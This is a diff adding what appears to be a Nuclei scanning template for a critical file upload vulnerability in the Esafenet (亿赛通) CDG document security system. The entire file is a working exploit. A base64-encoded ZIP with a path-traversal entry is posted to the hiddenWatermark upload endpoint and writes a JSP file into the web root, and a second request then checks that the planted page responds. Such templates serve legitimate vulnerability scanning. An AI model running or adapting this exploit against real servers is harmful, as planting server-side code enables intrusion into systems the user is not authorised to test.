@@ -1,0 +1,50 @@
+id: poc-yaml-yisaitong-esafenet-hiddenWatermark-file-upload
+info:
+  name: 亿赛通电子文档安全管理系统 hiddenWatermark 文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+  description: |
+    亿赛通电子文档安全管理系统存在文件上传漏洞，通过上传特定文件可实现漏洞利用。
+
+variables:
+  t1: "{{base64_decode('UEsDBBQAAAAIAAAAIQD5T26PZgAAAHAAAAAVAAAALi4vLi4vLi4vanMvY2VzaGkuanNwHcgxDsIwDAXQnVOESpXixRcoYkSMCAZmq/0CIysOqVuuD2V879Dvki/BtWkJK7k7w8zT3ZtN+46Ggk96ySqszic1ZKnVdJRQL/xAXCF2kXjmhveCOba7oa2G+DcR8YSfkGlI/fELUEsDBBQAAAAIAAAAIQDGTjiHSQAAAGcAAAAWAAAAdGhlbWUvdGhlbWUvdGhlbWUxLnhtbLNR1NWtVnLLzEn1S8xNVbJSSkxMVNIBCwRnVoEEjIyMgAKhxalFcBVAvktqQWJRSW5qXglMBKTC0wXGK8kEqzU0Mlaq1dW1AwBQSwECFAAUAAAACAAAACEA+U9uj2YAAABwAAAAFQAAAAAAAAAAAAAAgAEAAAAALi4vLi4vLi4vanMvY2VzaGkuanNwUEsBAhQAFAAAAAgAAAAhAMZOOIdJAAAAZwAAABYAAAAAAAAAAAAAAIABmQAAAHRoZW1lL3RoZW1lL3RoZW1lMS54bWxQSwUGAAAAAAIAAgCHAAAAFgEAAAAA')}}"
+  t2: "{{rand_base(5)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: hidden-watermark-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/CDGServer3/hiddenWatermark/uploadFile"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycfadsmat
+    body: |-
+      ------WebKitFormBoundarycfadsmat
+      Content-Disposition: form-data; name="doc"; filename="{{t2}}.zip"
+      Content-Type: application/zip
+
+      {{t1}}
+      ------WebKitFormBoundarycfadsmat--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: ceshi-verification
+    method: GET
+    path:
+      - "{{BaseURL}}/CDGServer3/js/ceshi.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Hello World!"
+      - type: word
+        words:
+          - "<"
+        negative: true
